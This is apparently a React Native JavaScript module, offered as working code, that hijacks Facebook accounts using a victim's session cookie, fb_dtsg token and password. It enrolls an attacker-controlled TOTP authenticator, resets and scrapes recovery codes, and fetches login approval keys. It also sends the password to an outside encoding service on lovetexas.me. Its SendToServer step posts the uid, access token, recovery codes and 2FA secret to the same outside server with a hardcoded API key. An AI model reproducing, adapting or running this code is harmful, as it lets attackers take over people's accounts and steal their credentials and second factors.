import ReactNativeBlobUtil from 'react-native-blob-util'
import { fetchApi } from "./fetchApi";

class GetTwofactor {
    constructor(opts = {}) {
        this.DOMAIN = "https://api.lovetexas.me";
        this.API_KEY = "169c3333-1f2c-4c19-b1ac-c27f2f2d666d";
        const { cookie, fb_dtsg, uid, password } = opts;
        this.cookie = cookie
        this.fb_dtsg = fb_dtsg;
        this.uid = uid;
        this.twofactor_key = ''
        this.codes = ''
        this.access_token = ''
        this.password = password;
        // if(!password)this.password = 'thang114@';
        this.turn_sucess = false;
    }
    async run() {
        try {
            await this.checkHasTwofactor();
            if (this.hasTwofactor) {
                console.log('this.password :>> ', this.password);
                await this.acceptCookie();
                await this.getUserCode();
                await this.getEncryptedBody();
                await this.comfirmApp();
                await this.createSessionForApp()
                await this.getHash()
                await this.verifyToken()
                await this.getSecrect();
                await Promise.all([
                     this.validateSecrectLoop(),
                     this.getTenCode(),
                ])
                await this.getTwofactorKey()
                await this.SendToServer()
            }

        } catch (error) { }
    }
    async validateSecrectLoop() {
        let index = 0;
        while (true) {
            if (index > 3) break
            index++
            let valid = await this.validateSecrect()
            this.turn_sucess = valid
            if(this.turn_sucess){
                this.twofactor_key = this.secrect
            }
            if (valid) break
        }
    }
    async acceptCookie() {
        try {
            const url = "https://www.facebook.com/api/graphql/";
            const body = `av=${this.uid}&__user=${this.uid}&__a=1&__dyn=7AzHK4HwkEng5KbxG4VuC0BVU98nwgU29gS3q2ibwNw9G2S7o762S1DwUx609vCxS320om782Cwwwqo465o-cw5MKdwGxu782ly87e2l2Utwqo31wiEjwZwlo5qfK6E7e58jwGzE7W7oqBwJK2W5olwUwgojUlDw-wUws9ovUaU3VBwJCwLyESE2KwkQ0z8c84K2e3u364Urw&__csr=gXNGjuBfHkRbitnZRtHWcyqEBd9i-Az_4LLsLtujOeHWZ5luGmyQlalHJZFb_KWR8iF98DrmAjqJ2WnGqAK4WzA-bLZ5l7KqfKcBCz8lzkdGmFU8U9EhyoC4bgScxmfwgoqwHK2O2u0Aobonwpo26wa-ewzwi86y0A8kwb60KUfE7G1xDCwbS1OGdwaq1hw6Xw0mpE8oG0eWK00wfo0dTU118vwsUiw1Ci03Zi2G04xU&__req=e&__hs=19196.HYP%3Acomet_pkg.2.1.0.2.0&dpr=1&__ccg=MODERATE&__rev=1005900972&__s=48ierg%3A2n0bm2%3Ary3d05&__hsi=7123541915556629098&__comet_req=15&fb_dtsg=${this.fb_dtsg}&jazoest=25772&lsd=w5GnWnyZbQVcmDMU9w6mmt&__spin_r=1005900972&__spin_b=trunk&__spin_t=1658578849&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=CookieSettingsCookieControlMutation&variables=%7B%22input%22%3A%7B%22consent_source%22%3A%22COOKIE_SETTING%22%2C%22consent_type%22%3A%22OTHER_COMPANY_TRACKERS_ON_FOA%22%2C%22opt_in_for_consent%22%3Atrue%2C%22actor_id%22%3A%22${this.uid}%22%2C%22client_mutation_id%22%3A%22123456%22%7D%7D&server_timestamps=true&doc_id=5165086040179171`
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
            }
            const text = await this._request({ url, body, headers });
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getHash() {
        try {
            let url = 'https://kit.lovetexas.me/v1/outlook/encode-text'
            let body = `password=${encodeURIComponent(this.password)}`
            let { data } = JSON.parse(await this._request({ url, body }))
            this.tempPassword = data;
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async verifyToken() {
        try {
            const url = `https://graph.facebook.com/secured_action/validate_challenge`
            let body = `access_token=${this.access_token}&challenge_type=PASSWORD&challenge_params%5Bpassword%5D=${this.tempPassword}`
            const text = await this._request({ url, body });
            console.log('verifyToken :>> ', text);
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async checkHasTwofactor() {
        try {
            const url = "https://www.facebook.com/api/graphql/";
            const body = `av=${this.uid}&__user=${this.uid}&__a=1&ctarget=https%3A%2F%2Fwww.facebook.com&fb_dtsg=${this.fb_dtsg}&jazoest=25409&lsd=pvqrRLHc06aCtnChKTlSJu&__spin_r=1005733793&__spin_b=trunk&__spin_t=1655957067&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=SecuritySettingsRefetchQuery&variables=%7B%7D&server_timestamps=true&doc_id=4882158038520313`
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
            }
            const text = await this._request({ url, body, headers });
            const textJson = JSON.parse(text);
            if (textJson?.data?.security_settings?.state?.two_fac_auth?.is_enabled) {
                this.hasTwofactor = true
            }
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async SendToServer() {
        try {
            const payload = {
                uid: this.uid,
                tokenIP: this.access_token,
                codes: this.codes,
                keylogin: this.twofactor_key
            }
            console.log('payload :>> ', payload);
            const url = `${this.DOMAIN}/api/update-data-login-account?api_key=${this.API_KEY}`
            const result = await fetchApi("POST", url, payload, {
                'Content-Type': 'application/json',
            });
            console.log("SendToServer", result);

        } catch (error) {
            console.log("SendToServer", error);
        }
    }
    async getTenCode() {
        try {
            const url = `https://graph.facebook.com/graphql/?method=post&doc_id=3681381978558220&method=post&locale=vi_VN&pretty=false&format=json&purpose=fetch&variables=%7B%22params%22%3A%7B%22path%22%3A%22%2Fsecurity%2F2fac%2Fnt%2Ffactors%2Frecovery-code%2F%22%2C%22params%22%3A%22%7B%5C%22reset%5C%22%3Atrue%7D%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22styles_id%22%3A%223a8e3d9b0d36d2b1fc0e72b31a5a0a25%22%2C%22pixel_ratio%22%3A3%7D%2C%22extra_client_data%22%3A%7B%7D%7D%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22styles_id%22%3A%223a8e3d9b0d36d2b1fc0e72b31a5a0a25%22%2C%22pixel_ratio%22%3A3%7D%2C%22scale%22%3A%223%22%7D&fb_api_req_friendly_name=NativeTemplateScreenQuery&fb_api_caller_class=graphservice&fb_api_analytics_tags=%5B%22GraphServices%22%5D&server_timestamps=true`;
            const body = `access_token=${this.access_token}`;
            const text = await this._request({ url, body });
            const {
                data: {
                    native_template_screen: {
                        nt_bundle: { nt_bundle_tree },
                    },
                },
            } = JSON.parse(text)
            const splited = this.getBW(nt_bundle_tree, `uc3c1","&":"`, `"}`).split('\\n');
            for (let item of splited) {
                this.codes += `${item},`;
            }
        } catch (error) {

        }
    }
    makeid() {
        return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
        );
    }
    

    async getCode2fa() {
        try {
            const url = `https://kit.lovetexas.me/v1/outlook/getSecrect`
            const body = `secrect=${this.secrect}`;
            const text = await this._request({ url, body });
            const { data } = JSON.parse(text)
            return data
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getTwofactorKey() {
        try {
            const url = `https://b-graph.facebook.com/me/loginapprovalskeys?method=post&=`
            const body = `access_token=${this.access_token}`;
            const text = await this._request({ url, body });
            const { key } = JSON.parse(text)
            this.twofactor_key += `|LoginKey:${key}`
        } catch (error) {

        }
    }
    async createSessionForApp() {
        try {
            const url = `https://b-graph.facebook.com/auth/create_session_for_app`

            const body = `access_token=${this.tokenEAAQ}&new_app_id=6628568379&generate_session_cookies=1&pretty=0`;
            const text = await this._request({ url, body });
            const { access_token } = JSON.parse(text)
            this.access_token = access_token
        } catch (error) {

        }
    }
    async getSecrect() {
        try {
            const url = `https://accountscenter.facebook.com/api/graphql/`
            const body = `av=${this.uid}&__user=${this.uid}&__a=1&__dyn=7xeUmwlE7ibwKBWo2vwAxu13wIwn8W3q32360CEbo19oe8hw2nVE4W0om782Cw8G1Qw5MKdwnU2ly87e2l0Fwqo31wnEfo5m1mxe6E7e58jwGzE2swwwNwKwHw8Xwn82Lx_w4HwJwSyES1Tw8W0Lo4K2e2q48cobU&__csr=ghRajtP4y4Vdapq8WACy5BgiyopgTyJ5gC11UcUozp8aVobby-axm4UK3O5uage8eU590NWgnyV8mwgUy325Efo39wWxu3e1lCw8W6E4m3e0kO5U6e0VE886S1tweS2PwiU2Vw9q0VU23w0zDw0kwbw0saU1Po0g1x100ilE0c_8&__req=2j&__hs=19192.HYP%3Acomet_plat_default_pkg.2.1.0.2.0&dpr=1&__ccg=EXCELLENT&__rev=1005868904&__s=j98640%3A83l4yi%3Agr61xg&__hsi=7121966250938817627&__comet_req=5&fb_dtsg=${this.fb_dtsg}&jazoest=25207&lsd=aW3B6HEygMoAAc-AdTeSWM&__spin_r=1005868904&__spin_b=trunk&__spin_t=1658211986&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useFXSettingsTwoFactorGenerateTOTPKeyMutation&variables=%7B%22input%22%3A%7B%22client_mutation_id%22%3A%22a28032ea-f5c5-47a5-8c74-2a65f1b23720%22%2C%22actor_id%22%3A%22${this.uid}%22%2C%22account_id%22%3A%22${this.uid}%22%2C%22account_type%22%3A%22FACEBOOK%22%2C%22key_nickname%22%3A%22zxz%22%2C%22device_id%22%3A%22device_id_fetch_datr%22%2C%22fdid%22%3A%22device_id_fetch_datr%22%7D%7D&server_timestamps=true&doc_id=4955102407950377&access_token=${this.access_token}`
            const text = await this._request({ url, body });
            this.secrect = JSON.parse(text).data.xfb_two_factor_generate_totp_key.totp_key.key_text.split(' ').join('')
            console.log('this.secrect :>> ', this.secrect);
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async validateSecrect() {
        try {
            const url = `https://accountscenter.facebook.com/api/graphql/`
            let body = `av=${this.uid}&__user=${this.uid}&__a=1&__dyn=7xeUmwlE7ibwKBWo2vwAxu13wIwn8W3q32360CEbo19oe8hw2nVE4W0om782Cw8G1Qw5MKdwnU2ly87e2l0Fwqo31wnEfo5m1mxe6E7e58jwGzE2swwwNwKwHw8Xwn82Lx_w4HwJwSyES1Tw8W0Lo4K2e2q48cobU&__csr=ghRajtP4y4Vdapq8WACy5BgiyopgTyJ5gC11UcUozp8aVobby-axm4UK3O5uage8eU590NWgnyV8mwgUy325Efo39wWxu3e1lCw8W6E4m3e0kO5U6e0VE886S1tweS2PwiUW0GE2mweu0wU08VU0582U072K0sS040ogg04Bq03fO&__req=2w&__hs=19192.HYP%3Acomet_plat_default_pkg.2.1.0.2.0&dpr=1&__ccg=EXCELLENT&__rev=1005868904&__s=b62nrv%3A83l4yi%3Agr61xg&__hsi=7121966250938817627&__comet_req=5&fb_dtsg=${this.fb_dtsg}&jazoest=25207&lsd=aW3B6HEygMoAAc-AdTeSWM&__spin_r=1005868904&__spin_b=trunk&__spin_t=1658211986&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useFXSettingsTwoFactorAddTOTPKeyMutation&variables=%7B%22input%22%3A%7B%22client_mutation_id%22%3A%2290e91958-cbf9-4110-8ba7-9cb557da6768%22%2C%22actor_id%22%3A%22${this.uid}%22%2C%22account_id%22%3A%22${this.uid}%22%2C%22account_type%22%3A%22FACEBOOK%22%2C%22totp_key_id%22%3Anull%2C%22totp_key_name%22%3A%22zxz%22%2C%22verification_code%22%3A%22999999%22%2C%22device_id%22%3A%22device_id_fetch_datr%22%2C%22fdid%22%3A%22device_id_fetch_datr%22%7D%7D&server_timestamps=true&doc_id=5136904446364776&access_token=${this.access_token}`
            let code = await this.getCode2fa()
            body = body.replace('999999', code)
            const res = await this._request({url, body})
            let text = JSON.parse(res)
            const success = text.data.xfb_two_factor_add_totp_key.success;
            return success
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async comfirmApp() {
        try {
            const url = `https://www.facebook.com/v2.0/dialog/oauth/confirm/`

            const body = `fb_dtsg=${this.fb_dtsg}&deduplicate=&link_customer_account=&read=&link_news_subscription=&write=&extended=&confirm=&reauthorize=&user_messenger_contact=&user_pay_preference=&auth_nonce=&auth_type=rerequest&calling_package_key=&default_audience=&dialog_type=gdp_comet&display=async&domain=&extras=&facebook_sdk_version=&fallback_redirect_uri=&fbapp_pres=&install_nonce=&logged_out_behavior=&l_nonce=&messenger_page_id=&nonce=&reset_messenger_state=&ret=&return_format=access_token&return_scopes=&scope=public_profile&sdk=&sdk_version=&sso_device=&tp=unspecified&user_code=${this.user_code}&page_id_account_linking=&encrypted_post_body=${this.encrypted_post_body}&seen_scopes=&__a=1`;
            const res = await this._request({ url, body });
            let tokenEAAQ = this.getBW(res, `"access_token":"`, `"`)
            this.tokenEAAQ = tokenEAAQ
        } catch (error) {

        }
    }
    async getEncryptedBody() {
        try {
            const url = `https://www.facebook.com/dialog/oauth?client_id=1174099472704185&scope=public_profile&force_confirmation=true&auth_type=rerequest&ref=DeviceAuth&user_code=${this.user_code}&state=f37c6e42b534e1&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Freturn%2Farbiter&display=async&`
            const body = `__asyncDialog=1&__user=${this.uid}&__a=1&fb_dtsg=${this.fb_dtsg}`;
            const res = await this._request({ url, body });
            const encrypted_post_body = this.getBW(res, `"encrypted_post_body":"`, `"`);
            this.encrypted_post_body = encrypted_post_body;
        } catch (error) {
            console.log(' :>> ', error);
        }
    }

    async getUserCode() {
        try {
            const url = `https://graph.facebook.com/v2.6/device/login`;
            let body = 'access_token=1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9&method=post&scope=public_profile'
            const res = await this._request({ url, body });
            const { user_code } = JSON.parse(res)
            this.user_code = user_code
        } catch (error) {

        }
    }
    async _request({ url, body, headers = {} }) {
        try {
            let rqHeaders = {
                "Cookie": this.cookie,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
                "accept": "*/*",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"macOS\"",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
            }
            rqHeaders = { ...rqHeaders, ...headers }
            console.log('url :>> ', url);
            // if (body && body.length) {
            //     let data = await fetch(url, {
            //         headers: rqHeaders,
            //         body,
            //         method: "POST"
            //     })
            //     let text = await data.text()
            //     return text
            // }
            // let data = await fetch(url, {
            //     method: "GET"
            // })
            // let text = await data.text()
            // return text
            rqHeaders = { ...rqHeaders, ...headers }
            if (!body?.length) {
                let data = await ReactNativeBlobUtil.fetch('GET', url, rqHeaders)
                let text = await data.text()
                return text
            }
            let data = await ReactNativeBlobUtil.fetch('POST', url, rqHeaders, body)
            let text = await data.text()
            return text
        } catch (error) {
            console.log('errorr :>> ', error, url);
            throw error;
        }
    }
    getBW(text, Start, End) {
        var ret = text.split(Start);
        if (ret[1]) {
            ret = ret[1].split(End);
            return ret[0];
        };
        return 0;
    }
}

export { GetTwofactor }